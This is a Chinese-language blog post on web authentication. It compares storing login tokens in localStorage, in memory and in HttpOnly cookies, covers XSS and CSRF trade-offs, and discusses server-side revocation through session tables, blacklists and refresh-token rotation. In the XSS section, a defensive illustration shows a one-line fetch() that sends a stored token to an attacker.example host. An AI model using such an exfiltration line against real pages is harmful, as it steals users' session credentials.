---
title: 登录凭证放哪更安全
description: 登录 token 放 localStorage、内存还是 Cookie，以及服务端还要不要记账：拆开客户端和外泄、撤销两件事。
tags:
  - 鉴权
  - JWT
  - 安全
  - Cookie
  - XSS
  - CSRF
  - Web
category: 技术
hero: ./auth-token-storage-hero.jpg
heroCopyright: Photo by <a href="https://unsplash.com/@flyd2069?utm_content=creditCopyText&utm_medium=referral&utm_source=unsplash">FlyD</a> on <a href="https://unsplash.com/photos/mT7lXZPjk7U?utm_content=creditCopyText&utm_medium=referral&utm_source=unsplash">Unsplash</a>
type: post
date: 2026-10-24 00:50:00
---

说到登录 token 该放哪，很多人会说：不就是 `localStorage` 吗，教程都这么写。是的，能跑通。不过吵到后来你会发现，大家吵的其实不是同一个「放」——有人在说浏览器里谁能读到这串字符，有人在说服务端还认不认这张票。两件事叠在一起，答案才会拧成一团。

这篇我想按这个缝拆开写。先看客户端，再看服务端。JWT 好不好用，穿在中间说，不当口号。

## 教程里那一套

登录接口把 token 塞进响应体，前端丢进 `localStorage`，之后每个请求自己拼 `Authorization`：

```ts
async function login(email: string, password: string) {
  const res = await fetch('/api/login', {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({ email, password }),
  });
  const { token } = await res.json();
  localStorage.setItem('token', token);
}

async function fetchProfile() {
  const res = await fetch('/api/me', {
    headers: {
      Authorization: `Bearer ${localStorage.getItem('token')}`,
    },
  });
  return res.json();
}
```

刷新不丢，跨域调 API 也省事——Cookie 那套同站限制，管不到你手写的 Bearer。下午教程能写完，晚上 demo 能上线。

麻烦不在 JWT 中间那串点，而在：同源页面上，谁都能读 `localStorage`。

## XSS 拿走的是钥匙

你的业务代码能读，npm 依赖能读，统计脚本和客服挂件能读。哪天 XSS 进来了——富文本没转义、依赖投了毒、扩展往页面里塞脚本——攻击者也能读。

```ts
fetch('https://attacker.example/collect', {
  method: 'POST',
  body: localStorage.getItem('token'),
});
```

Bearer 字面意思就是谁拿着谁是你。他不需要你的标签页还开着，把票带回自己机器，对着 API 重放就行，直到过期。过期写成七天，就是七天离线通行证。服务端如果只验签、不记账，中间也很难把这张票收回来。

## 「能跑 JS 就全完了」？

常见说法是：攻击者已经能在页面上跑脚本了，藏 token 也没用，他照样读页面、代发请求。

XSS 本身确实够严重。`HttpOnly` 也防不住 XSS，只是让脚本读不到那份 Cookie——谁跟你说「上了 HttpOnly 等于防 XSS」，是把两件事揉在一起了。

可是「能读到凭证」和「只能蹭当前会话」，损失不一样。读得到，票可以带走，任意机器、任意时间重放，直到过期（或你另有撤销）。读不到，他多半只能在受害者浏览器里动手，请求还是从那台机器出去，你的日志、限流、风控至少还挂在原来的会话路径上。

一个是偷走钥匙；一个是人还站在客厅里，摄像头还对着。两样都讨厌，可 XSS 总会以某种形式冒出来。目标只能是：少出 XSS，出事时别把爆炸半径拉满。

那有没有一个地方，是页面 JS 根本伸不进去的？

## 放内存够不够

第一反应常常是：别落盘，变量里搁着。

```ts
let accessToken: string | null = null;

async function login(email: string, password: string) {
  const res = await fetch('/api/login', {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({ email, password }),
  });
  const { token } = await res.json();
  accessToken = token;
}
```

比 `localStorage` 难扫一点，没有一块挂在 `window` 上按 key 枚举的公告板。可是攻击者的脚本和你的脚本在同一个 JS 世界里——挂钩 `fetch`，等你拼上 `Authorization` 再抄走，仍然做得到。

产品代价也实在：一刷新就掉线，开第二个标签也是空的。于是几乎所有人都会再加一张更长命的 refresh。refresh 若再进 `localStorage`，等于绕回原点。

对我来说可以收短一句：JS 够得到的地方，放不下长期凭证。

## Cookie，以及它换来的麻烦

Cookie 是服务器让浏览器存下、之后请求自动带上的小值。几个标志把口收紧：

```
Set-Cookie: __Host-session=abc123; HttpOnly; Secure; SameSite=Lax; Path=/
```

`HttpOnly` 让 JS 读不到；`Secure` 只走 HTTPS；`SameSite` 管跨站时带不带；`__Host-` 前缀再逼你开 `Secure`、不许乱写 `Domain`、`Path` 必须是 `/`，把 Cookie 锁在当前主机上。前端反而省事——响应体里可以没有 token，请求带上 `credentials: 'include'` 就行。

```ts
async function login(email: string, password: string) {
  await fetch('/api/login', {
    method: 'POST',
    credentials: 'include',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({ email, password }),
  });
}

async function fetchProfile() {
  const res = await fetch('/api/me', { credentials: 'include' });
  return res.json();
}
```

`HttpOnly` 挡的是外泄，不是滥用。XSS 仍可在用户浏览器里代发已认证请求，只是很难把凭证拷回家、留到下周二再用。

可是 Cookie 会自动附带。CSRF 就从这扇门进来。

你登录了银行，会话 Cookie 还在。另一个标签打开奇怪优惠页，页里藏了自动提交的表单，POST 到银行转账接口。浏览器看见目标是银行的域，就把银行的 Cookie 带上。服务端若只认「有合法 Cookie」，就会当成你点的。

注意：`localStorage` + 手写 `Authorization` 对这种「外国站拼不出你的头」的伪造，其实是免疫的。换成 Cookie，等于用防外泄换来一门防伪造的课。

这门课有标准答卷，但别指望只拧一个旋钮。写操作带上 CSRF token（API 里常见 double-submit：可读 Cookie 一份，请求头再回显一份，服务端比对）；`SameSite=Lax` 或 `Strict` 作纵深，可别当唯一防线——`Lax` 对顶级 GET 导航仍会带 Cookie，所以 GET 绝不能改数据，而且 `SameSite` 管的是 site 不是 origin，`app.example.com` 和 `payments.example.com` 仍算同站；再看一眼 `Origin` / `Sec-Fetch-Site`，写操作上跨站直接拒，很实用。对我来说，token 是主防，后面两层是补刀。只开 `SameSite` 就宣布 CSRF 搞定了，边界不够。

## Cookie 里到底放什么

存的位置谈到 Cookie，下一个岔路是：值是什么。

把 JWT 整段塞进 `HttpOnly` Cookie，外泄面比 `localStorage` 好一截，但票面还是那张可离线验证的 JWT——登出、改密、封号，服务端若不另记账，照样要等 `exp`。JWT 还偏大，Cookie 有体积上限，跨子域、跨站 API 时携带规则也会绊人。

更「旧」的路是：Cookie 里只放一段高熵随机串，服务端会话表里才写「这串对应谁、是否还有效」。登出删行；封号、改密、踢设备，都改你能改的那一行。登录时发新会话 ID，别沿用客户端带来的旧值，避免会话固定；过 2FA、进敏感区时再转一次 ID。

JWT 没坏。内网微服务互认身份、SSO 里 IdP 给你的一次性断言（验完换成自己的会话，再把那张 JWT 丢掉），它都很合适。把「浏览器登录态」和「服务间身份断言」揉成一张七天 JWT，才会把撤销问题整个扛回来。

客户端这边，我愿意先停在这儿：长期钥匙别放进 JS 够得到的地方；上了 Cookie 就老老实实做 CSRF。可是「藏得好」回答不了「旧票还能不能用」。那是服务端的事。

## 服务端还要不要记账

客户端管谁能碰到票；服务端管这张票还算不算数。票面叫 JWT 还是一段无意义的字符串，只是载体。真正分岔的是：服务端有没有一份可改的存储，改的粒度有多细。

纯无状态、只验签，答案只有一个：等到 `exp`。到期前，签名合法就是你。产品文案一旦写出「立即退出所有设备」「改密后旧登录失效」「后台一键封号」，你就已经在要服务端存储——会话表、黑名单、用户版本、refresh 仓库，名字不同，性质一样。

过期调短呢？access 从七天改成十五分钟，缩小的是外泄后的窗口，不是撤销本身。业务还要「保持登录」，于是长短搭配：短的调 API，长的换票。问题平移到 refresh——它若也是永不记账的长 JWT，登出瞬间照样废不掉，除非你愿意等它自己过期。长短 token 不是消灭状态，是把「要不要查库」从每个 API 请求挪到偶尔换票。

主动登出也一样。前端清掉 `localStorage` 或内存，只表示这台浏览器不再出示。票若已被拷走，或还在另一台设备上，纯验签的服务端仍会放行。会话表可以删行，旧 Cookie 再来就是 401。要「立刻、全端、对已发出的票生效」，没有第三种魔法：有状态，或等过期。

黑名单是很多人给 JWT 补的那一刀：载荷里带 `jti`，登出时写入带 TTL 的存储，请求验签后再查一次。短窗口内能作废单张票；热路径多一次读，而且你已经放弃「只验签、不查库」。黑名单往往比全量会话小，但「比会话表省」不等于「仍然无状态」。对我来说，它就是有状态撤销层，票面格式还叫 JWT 而已。

再粗一点，可以记用户版本：改密、强制下线时 `token_version` +1，JWT 里带签发时的版本，对不上就拒。一次废掉该用户名下旧票，粒度是「人」不是「设备」。要按设备踢，还是得回到会话表，或按设备存的 refresh。

认真做 OAuth 时，refresh 很少是永不查库的长 JWT。更常见是每次换票作废旧的、发新的；已作废的再出现，就当盗用，整链烧掉。access 仍可短、仍可靠验签；可撤销性和盗用检测挂在 refresh 存储上。多标签页同时 401，会误触复用检测——实现上通常要给刚轮换的票留一点宽限。这是状态机，不是签名算法。

所以 JWT 解决的是「怎么可信地携带声明」，不是「怎么管理可撤销的登录态」。登录态要可撤销，服务端总会有一处存储；客户端藏得再好，也替不了这一层。

## 两边怎么一起落地

拆开说完，落地时它们常绑在一起。

若浏览器还得碰到 OAuth 式的 access / refresh：access 短寿命，放内存，走 `Authorization`；refresh 放 `HttpOnly` Cookie，`Path` 尽量收到只服务换票的接口，`SameSite` 收紧。页面一刷新，access 没了，启动时静默打一次 refresh；失败再回登录页。多个并行 401 要合并成同一次进行中的换票，否则带着轮换的 refresh 会被打爆，误伤成整链烧毁。浏览器还碰得到 token 时，这一档比较稳——CSRF 仍要做，XSS 窗口内仍能蹭 access。

再紧一档是 BFF：SPA 只拿一张指向 BFF 的普通 `HttpOnly` 会话 Cookie，真正的 access / refresh 停在服务端。浏览器只打同源 BFF；BFF 查会话、附上 Bearer、转发到真正的 API。页面 JS 生命周期里看不到上游 token。XSS 仍能蹭 BFF 会话代发请求，但偷不走可离线重放的那张票。OAuth 换码也可以变成 confidential client。代价是多一跳、要养这层 BFF，Cookie 的 CSRF 功课一件不能少。同站、数据敏感时，这往往比对「JWT 换个存储 API」更对症。

还有一类威胁，上面这整条线都挡不住：本机恶意软件直接读浏览器 Cookie 数据库。`HttpOnly` 挡的是 JS，挡不住磁盘上的文件。偷到的会话 Cookie 可以导入另一台机器。完美的 BFF 也救不了「用户机器已经被挖空」——那时要比的是会话寿命、异常登录检测、设备绑定一类能力。浏览器和平台还在演进，别预期成银弹。客户端选型解决的是网页里的爆炸半径；服务端选型解决的是凭证还能不能用。都不是端点安全的全部。

## 你怎么选

别按名词站队，按你真正要的能力倒推。

同站前端加自有后端、登录态就是「你是不是还登着」：Cookie 用 `HttpOnly`、`Secure`、收紧的 `SameSite`，值放 opaque 会话 ID，CSRF 按前面做；服务端以会话表为真相。JWT 留给服务间，别默认当七天浏览器门票。

必须让浏览器拿到 OAuth 的 access / refresh：access 放内存，refresh 放收窄 Path 的 `HttpOnly` Cookie，服务端做轮换和复用检测；写操作仍防 CSRF，刷新合并成单飞。

敏感、又能接受多一跳：浏览器只持有会话 Cookie，上游 token 留在 BFF。

产品写了即时登出、改密失效、按设备踢：先定服务端存哪——会话表、黑名单、版本号还是 refresh 库——再回头选客户端。顺序别反。

对我来说，客户端吵的是外泄和伪造你更怕哪一个、另一个有没有按住；服务端吵的是要不要即时作废——要，就承认有一份存储，不要，就接受过期窗口。两边都答完，方案才齐。
